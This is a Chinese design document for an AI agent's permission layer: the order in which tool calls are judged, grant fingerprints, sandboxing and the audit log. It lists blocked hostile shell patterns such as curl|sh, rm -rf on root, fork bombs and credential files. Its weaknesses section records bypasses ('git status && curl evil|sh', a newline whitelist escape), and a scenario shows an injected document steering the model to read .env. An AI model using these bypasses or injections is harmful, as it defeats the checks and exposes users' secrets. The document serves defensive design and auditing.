# 52-权限系统全景机制（裁决 / 指纹 / 沙箱 / 审计）

> 定稿：2026-09-05。本文是权限系统（安全层）的**机制全景**：三段地图（裁决→授权→审计）、
> 判定序与指纹的具体设计、一次 ASK/一次 DENY 的完整实例、优点/缺点与未完成清单。
> 权威口径上游：`40-MCP与SKILL企业级融合设计.md`（指纹 v2 / 停用即 DENY）、
> `43-bash专用工具路由设计.md`（只读白名单）。

## 1. 设计背景：四个约束决定全部形态

1. **默认安全但不碍事**——单用户本地场景，工作区内安全写自动放行（默认档 `risk`），
   把确认次数压到"只有真正危险的动作才 ASK"；但危险动作的判定必须机器执法
   （黑名单/密钥/规则），不靠模型自觉。
2. **单向性不可逆**——DENY 不可被 grant 穿越、撤销即 DENY、放宽延后收紧即时
  （runtime_mode 轮内取严）——所有"放行通道"都是单行道。
3. **授权身份防注入**——grant 的指纹只含工具**身份**（注册名/命令前缀），绝不含
   参数——参数被注入也无法伪装成已授权工具。
4. **远程与子代理是加固面**——远程会话（微信通道）永不静默放行、worker 永不 ASK
   （不可达确认面一律 DENY）。

## 2. 三段地图与数据流

```
                 ┌──────────────────────────────────────────┐
 工具调用 ──────►│ ① 裁决 evaluate_policy（三态判定序）        │
                 │   deny_tools→MCP deny→always-allow→外发    │
                 │   →UI→Agent→Bash→读→写→未知默认 ASK        │
                 └───────┬──────────────┬───────────────┬────┘
                      DENY│           ASK│            ALLOW│
                         ▼              ▼                 ▼
                 拒绝+审计      ② 授权（挂起→人工→指纹 grant）   直接执行
                                PermissionCoordinator.request
                                → pending（TTL 180/60s）→ SSE 面板
                                → resolve → store（指纹 v2, TTL 24h）
                 ┌──────────────────────────────────────────┐
                 │ ③ 审计（append-only JSONL + redact）       │
                 │   permission.{pending,resolved,denied,     │
                 │   grant.added,grant.revoked}               │
                 │   tool.{started,finished}                  │
                 └──────────────────────────────────────────┘
```

| 段 | 关键文件 | 存活期 |
|---|---|---|
| ① 裁决 | `permissions/policy.py evaluate_policy_impl:1426`（判定序 `:878` 注释） | 每次调用 |
| ② 授权 | `engine/permission_coordinator.py` + `permissions/store.py` + `ask_store.py` | pending 180/60s；grant 24h |
| ③ 审计 | `audit/log.py` + `audit/redact.py` | append-only 永久 |

一句话：**① 判定序决定"问不问"，② 决定"问完记多久"，③ 决定"事后能不能查"——
三段各自单向，且 DENY 在 ① 就终结（永远到不了 ②）。**

## 3. 各段机制

### 3.1 裁决判定序（`policy.py:878` 注释 + `:1426` 实现）

固定顺序（先收紧后放行）：`deny_tools` → MCP 分支（企业 deny/`mcp_disabled`/未知=ASK）→
`_ALWAYS_ALLOW` 清单 → 外发工具（WebFetch/WebSearch/SendToWeChat）→ UI → Agent →
**Bash（黑名单→密钥→规则 DENY→策略 deny_commands→只读白名单→规则 ASK→默认 ASK）** →
读工具 → 写工具（filesystem 硬 DENY：密钥/.git/.ssh/受保护元数据 → 区外 ASK）→
未知工具默认 **ASK**（`policy.py:1731`）。**DENY 先于 grant**：`evaluate_policy` 仅在
结果为 ASK 时才查 always-allow 授权（`:1386-1421`）——撤销/禁用即 DENY，不可穿越。

### 3.2 Bash 策略（`bash_policy.py`）

- `_DENY_RULES`（`:20-106`）：rm -rf 根 / `--no-preserve-root` / mkfs / dd of= /
  shutdown / reg delete HKLM / `iwr|iex` / `curl|sh` / fork bomb / `-EncodedCommand` /
  certutil -decode / UNC 破坏等（re.S 跨行匹配）；
- **只读白名单**（`_READONLY_BASES:109` + 子命令白名单 `:155`）：`git status/log/diff`、
  `rg`、`cat` 等前缀命中 → ALLOW（配合透明路由改道专用工具）；
- fail-closed：坏 `bash_rules.json` 回退内置规则 + 审计（`:404-421`）；
- worker：白名单 ALLOW、其余 **DENY、永不 ASK**（`policy.py:944-963`）；
- 远程会话（`ilink:`/`filehelper:`）：更严、无法弹窗一律 DENY（`bash_policy.py:622`）；
- 透明路由联动：只读命令在 Bash 已 ALLOW 后改道 Read/Grep 执行（目标工具再过完整
  三态——换执行器不换纪律）。

### 3.3 文件系统与写范围

- `filesystem.py` 硬 DENY：`DANGEROUS_FILES`（.env 族/id_rsa/credentials/.npmrc/.pypirc，
  `:68-82`）+ `.pem/.key/.p12/.pfx` + `.ssh` 组件 + 受保护元数据（.git/.xeyo/.agents
  顶层写 DENY，`:285`）；realpath 防 symlink 逃逸（`:117-118`）；
- `write_scope.py`：子代理写范围 contextvars；空 scope=禁写；过宽（`.`/仓根/盘符根）
  自动降只读（`normalize_worker_scope:46`）；policy 实时硬 DENY + WriteStore 落盘前
  二次校验——**双层强制，非约定**；
- `runtime_mode/presets`：readonly / workspace-write / full 预设；轮内取严、放宽延后
  （`runtime_mode.py:89-105`）；坏配置回退更严档 + 审计（`workspace_policy.py:114-148`）。

### 3.4 ASK 生命周期与指纹 v2

- `PermissionCoordinator.request`（`permission_coordinator.py:57`）：写 pending 审计 →
  置 `waiting_permission` → SSE `PermissionPendingEvent`（tool_input/reason/choices/
  intent/expiry）→ `wait` 挂起；超时（普通 180s / 危险 60s，`pending_ttl.py:21`）
  补写 `resolved(approved=False, outcome=timeout)` **按拒绝处理**；
- `store.py` 授权结构：`PermissionGrant(tool_name, fingerprint, scope, expires_at, grant_id)`，
  TTL 24h；**指纹 v2**（`:444-497`）：MCP=`sha256(["mcp-tool",注册名])`（**不含 args**，
  参数注入免疫）；Bash=命令前两 token 前缀（已知放大缺口，见 5.2）；v1/v2 版本隔离
  防旧授权复用；撤销 `revoke(grant_id)` 写 `grant.revoked`；
- AskUserQuestion（`ask_store.py`）与权限 ASK 是**两套同构面板**（store/端点独立）；
  resolve 的 actor 由调用方自报、全程无审计（六轮审计 #20）。

### 3.5 沙箱与审计

- **沙箱**：bash_tool 每次执行创建 Windows Job Object（内存限额 512MiB，env/policy
  可调，`win_job.py:163-171`）+ KillOnJobClose 整树终止 + `taskkill /T` 树杀——
  **资源护栏有实体**；但文件/网络/CPU/进程数无隔离（无 AppContainer），POSIX 无
  setsid/rlimit——"隔离面纸面化"（五轮审计修正结论）；
- **审计**：append-only JSONL（`~/.xeyo/audit/audit.jsonl`），事件含 session/turn/
  tool/matched_rule/command_summary（200 字符截断）；redact 对已知敏感 key 正则遮罩
  （**浅层不递归**）；`query()` 无鉴权（β3 遗留，四轮门禁矩阵已列）；
- **hooks**：PreToolUse/PostToolUse/PermissionRequest 子进程执行——不能改写参数、
  PermissionRequest 非零退出（含超时）**fail-closed DENY**（`hooks.py:113-117`）、
  默认关。

## 4. 两次裁决的完整实例（虚构剧本）

**实例 A（ASK→allow→二次直通）**：模型调 `Bash(git push origin main)` →
判定序走 Bash 分支：黑名单未命中 → 密钥未命中 → 规则命中"push=写操作" → ASK →
SSE 面板（intent=confirm，倒计时 180s）→ 用户选 allow → `resolve(actor="desktop")` →
grant 落库（指纹=`Bash:git push`，24h）→ 执行。**3 小时后**同命令再调 → ASK 位置
直接查到 grant（仅当判定序结果是 ASK 才查）→ ALLOW 直通。此时用户撤销 →
revoke → 下次同命令回到 ASK；若命中 deny_tools 则无论如何 DENY。

**实例 B（注入攻击被指纹挡住）**：恶意文档诱导模型调 `mcp__evil__read_file` 并在
参数里塞 `{"path":"C:/Users/..../.env"}`——① 判定序：该 MCP 工具此前被 approve 过
（指纹=sha256(["mcp-tool","mcp__evil__read_file"])，**参数不进指纹**）→ ALLOW 放行 →
但工具自身执行层再过 filesystem 硬 DENY → `.env` 命中 DANGEROUS_FILES → **内容级拒绝**。
两层独立：指纹防"身份伪造"，filesystem 防"内容越界"——注入者需要同时突破两层。

## 5. 优点 / 缺点与情况说明

### 5.1 优点

1. **判定序 deny-first 且单向**：黑名单/密钥/规则全部在白名单放行之前；DENY 不可被
   grant 穿越、撤销即 DENY、停用即 DENY（extension `enabled_probe` 同规）——
   放行通道全是单行道；
2. **指纹 v2 设计用心**：身份不含参数（注入免疫）+ 版本隔离（v1 失效）+ 24h TTL +
   revoke 通道；契约测试六项（同异指纹/伪装字段免疫/回环/DENY 压过 grant）强度高；
3. **纵深一致**：registry 裁决 + 工具内 filesystem 硬 DENY 双层独立；worker/远程
   "永不 ASK→DENY"避免不可达确认面；hooks fail-closed 且不能改参数；
4. **fail-closed 文化**：坏 bash_rules/坏 workspace_policy 回退**更严档**+审计；
   超时=拒绝；AskUserQuestion 无 TTL（不超时）等边界都有明确语义；
5. **沙箱有实体护栏**：Job Object 内存限额+树终止防失控进程（五轮修正：不是纯纸面）；
   资源失控与孤儿进程在结构上被兜住。

### 5.2 缺点与情况说明

1. **隔离面纸面化**：文件/网络/CPU/进程数无隔离（无 AppContainer/rlimit）——
   ALLOW 后的命令仍可外联/读任意可读文件；Job Object 只兜"内存与孤儿"；
2. **Bash grant 前缀注入**：指纹取前两 token（`store.py:491-496`）——
   `git status && curl evil|sh` 命中 `git status` 授权（与"参数不进指纹"的免疫叙事
   在 Bash 语境下矛盾，六轮审计 #3）；
3. **审计信任链未闭合**：JSONL 无签名、文件可被任意进程改写、query 无鉴权、
   redact 浅层不递归（嵌套凭据原样落盘）、无 denied 告警通道——"可查不可信、
   可信不可响应"；
4. **默认档非默认拒绝**：`risk` 档工作区安全写直通、未知工具 ASK（非 DENY）；
   max/never 档放开区外写与外发免确认——最小权限未达（单用户场景下是有意权衡，
   但开源后需要文档明示威胁模型）；
5. **门禁三态混杂**（server 路由层）：loopback 依赖/逐端点/全无三种风格并存，
   workspace 的 18 个文件端点与 audit/memory 路由裸奔（四轮矩阵）；
6. **AskUserQuestion 无审计**：问/答/取消不落 audit、actor 自报无鉴权；
7. **bash 换行绕过白名单**：`_COMPOSITE_RX` 不含 `\n`（`bash_policy.py:532`）——
   `echo\npython -c ...` 可放行任意脚本（P0 级，五轮审计 #17）。

## 6. 耦合与解耦

- **权限 × 工具**：裁决内嵌 registry.run（漏斗不可绕）；工具内 filesystem 第二道；
  extension hooks 是附加门禁非替代裁决——三层互相独立、结果取严；
- **权限 × 通道**：远程/worker 的收紧实现在判定序内部（`is_remote_session → 强制
  ask/deny`，`policy.py:922-963`），通道层无感知——新增通道自动继承收紧语义；
- **权限 × 装配**：启停/撤销经 T_now 活页块广播 + `enabled_probe` DENY 门——
  权限状态变化对 KV 前缀零影响（权限从不进 system/history）；
- **权限 × 审计**：审计与裁决解耦（log 失败不阻塞裁决），但"解耦"也意味着审计
  可被静默致盲（无审计写入失败的告警升级）。
